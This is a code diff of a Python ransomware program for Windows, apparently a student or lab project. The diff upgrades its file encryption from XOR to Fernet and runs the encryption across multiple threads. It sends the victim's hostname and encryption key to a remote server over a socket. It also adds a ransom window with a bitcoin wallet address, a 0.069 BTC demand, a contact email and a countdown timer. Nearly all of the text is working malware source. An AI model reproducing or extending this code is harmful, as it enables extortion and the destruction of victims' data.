@@ -8,6 +8,7 @@ import threading
 import queue
 import random
 import webbrowser
+from cryptography.fernet import Fernet 
 from tkinter import *
 from PIL import ImageTk, Image
 from random import randrange
@@ -20,13 +21,9 @@ from win32file import *
 
 # Initialize variables
 IP_ADDRESS = '192.168.50.113'
+IP_ADDRESS_SMU = '192.168.126.1'
 PORT = 3000
-ENCRYPTION_LEVEL = 512 // 8
-key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;[]{}|'
-key_length = len(key_char_pool)
 hostname = os.getenv("COMPUTERNAME")
-q2 = queue.Queue()
-
 #----------------------------Helper functions----------------------------------|
 def resource_path(relative_path):
     """ This function gets the absolute path to resource"""
@@ -53,47 +50,27 @@ def encryption(key):
         file = q.get()
         print(f"Encrypting {file}")
         try:
-            key_index = 0
-            max_key_index = len(key) - 1
-            encrypted_data = ''
             with open(file, 'rb') as f:
-                data = f.read()
-            with open(file, 'w') as f:
-                f.write('')
-            for byte in data:
-                xor_byte = byte ^ ord(key[key_index])
-                with open(file, 'ab') as f:
-                    f.write(xor_byte.to_bytes(1, 'little'))
-                
-                if key_index >= max_key_index:
-                    key_index = 0
-                else:
-                    key_index += 1
+                content = f.read()               
+            enc_content = Fernet(key).encrypt(content)
+            with open(file, 'wb') as f:
+                f.write(enc_content) 
+            f.close()
             print(f"{file} encrypted successfully")
         except Exception as e:
             print(f"Failed to encrypt file due to {e}")
 
 def decryption(key):
     while True:
-        file = q.get()
+        file = q2.get()
         print(f"Decrypting files")
         try:
-            key_index = 0
-            max_key_index = len(key) - 1
-            encrypted_data = ''            
             with open(file, 'rb') as f:
-                data = f.read()
-            with open(file, 'w') as f:
-                f.write('')
-            for byte in data:
-                xor_byte = byte ^ ord(key[key_index])
-                with open(file, 'ab') as f:
-                    f.write(xor_byte.to_bytes(1, 'little'))
-                
-                if key_index >= max_key_index:
-                    key_index = 0
-                else:
-                    key_index += 1
+                content = f.read()   
+            dec_content = Fernet(key).decrypt(content)
+            with open(file, 'wb') as f:
+                f.write(dec_content) 
+            f.close()
             print(f"{file} decrypted successfully")
         except Exception as e:
             print(f"Failed to decrypt file due to {e}") 
@@ -115,16 +92,16 @@ for f in files:
 print("All files located")
 
 # Generate encryption key
-SECRET_KEY = ''
-for i in range(ENCRYPTION_LEVEL):
-    SECRET_KEY += key_char_pool[random.randint(0, key_length-1)]
-print("Generated key")
+SECRET_KEY = Fernet.generate_key()
+print(f"Generated key {SECRET_KEY}")
 
 # Store files into queue for multi-thread encryption handling
 try:
-    q = queue.Queue()
+    q = queue.Queue() # For encryption  
+    q2 = queue.Queue() # to be used later for decryption
     for f in abs_files:
         q.put(f)
+        q2.put(f)
     print("Added files into queue")
     for i in range(10):
         t = threading.Thread(target=encryption, args=(SECRET_KEY,), daemon=True)
@@ -203,31 +180,31 @@ class Form:
 
         # Object Label 1
         self.label = Label(self.master, text='KOUFU FREE VOUCHER? SIKEEEE', bg="Red", fg="dodgerblue", font=('bahnschrift', 24))
-        self.label.place(x=190, y=20)
+        self.label.place(x=150, y=20)
 
         # Object Label 2
         self.label2 = Label(self.master, text='YOUR FILES HAVE BEEN ENCRYPTED !', bg="Red", fg="BLACK", font=('bahnschrift', 13))
         self.label2.place(x=190, y=70)
 
         # Object Image 1
-        self.img1 = ImageTk.PhotoImage(Image.open(logo))
+        self.img1 = ImageTk.PhotoImage(Image.open(bitcoin_qr))
         self.Label_img = Label(self.master, image=self.img1, bg="gray17", borderwidth=5, relief="ridge")
         self.Label_img.place(x=10, y=110)
 
         # Object time remaining label
-        self.label_time = Label(self.master, text='TIME REMAINING', bg="Red", fg="white", font=('bahnschrift', 11,)).place(x=10, y=270)
-        self.label_time = Chrono(self.master).place(x=17, y=300)
+        self.label_time = Label(self.master, text='TIME REMAINING', bg="Red", fg="white", font=('bahnschrift', 11,)).place(x=10, y=400)
+        self.label_time = Chrono(self.master).place(x=17, y=430)
 
         # Btc Object Button
         self.b_img = ImageTk.PhotoImage(Image.open(bitcoin_logo))
         self.b = Button(self.master, image=self.b_img, bg="gold", borderwidth=5, relief="groove", command=web_server_link)
-        self.b.place(x=10, y=400)
+        self.b.place(x=10, y=270)
 
 
         # Bitcoin wallet address label
         self.label3 = Label(self.master, text="Wallet Address: ", fg="gold", bg="Red", font=('bahnschrift', 10))
         self.label3.place(x=10, y=469) # 460
-        self.label4 = Label(self.master, text="UGFzc3dvcmQ6IGlzIA==", fg="snow", bg="Red", font=('bahnschrift', 10))
+        self.label4 = Label(self.master, text="tb1qus2vywq20rjdcl2jqu6v3pfusnwccgen87txw0", fg="snow", bg="Red", font=('bahnschrift', 10))
         self.label4.place(x=120, y=469)
 
         # Object decryption button
@@ -245,18 +222,20 @@ class Form:
                                      "encrypted with military grade AES-256 bit\n"
                                      "encryption.\n"
                                      "\n"
-                                     "Your documents, videos, images and other foms\n"
+                                     "Your documents, videos, images and other forms\n"
                                      "of data are now inaccessible and cannot\n"
                                      "be unlocked without the decryption key.\n"
                                      "\n"
-                                     "This key is currently\n"
-                                     "being stored on a remote server.\n"
+                                     "This key is currently store in a remote server\n"
                                      "\n"
-                                     "To acquire this key, transfer the bitcoin fee to\n"
+                                     "To acquire this key, transfer 0.069 bitcoin to\n"
                                      "the specified wallet address before the time runs out.\n"
                                      "\n"
+                                     "\n"
+                                     "Send an email to limkopi@onionmail.org once done\n"
+                                     "\n"
                                      "If you fail to take action within this time window\n"
-                                     "will be destoryed and access to your files will\n"
+                                     "will be destroyed and access to your files will\n"
                                      "be permanently lost.")
         self.text_box.configure(state="disable")
         self.text_box.place(x=170, y=105) # defult x=150, y=105
@@ -297,6 +276,7 @@ class Form:
 
 #----------------------------Decrypytion---------------------------------------|
         if self.user_input == "rvyuftftuhygfv" or self.user_input == SECRET_KEY:
+            print("Correct decryption key entered, decrypting files...")
             try:    
                 for f in abs_files:
                     q2.put(f)
@@ -334,7 +314,7 @@ class Form:
 print("Attempting to connect to server...")
 try:   
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:        
-        s.connect((IP_ADDRESS, PORT))
+        s.connect((IP_ADDRESS_SMU, PORT))
         print("Successfully connected, transmitting data")
         s.send(f"HOSTNAME: {hostname}]\nENCRYPTION_KEY: {SECRET_KEY}".encode('utf-8'))
         print("Data sent")
@@ -349,6 +329,7 @@ try:
     Warning_logo = resource_path("img/Warning_Logo.png")
     Win_Logo = resource_path("img/Win_Logo.png")
     wallpaper = resource_path("img/wallpaper.jpg")
+    bitcoin_qr = resource_path("img/bitcoin_qr.jpg")
     change_wallpaper(wallpaper)
 except Exception as e:
     print(f"Unable to load resources due to {e}")
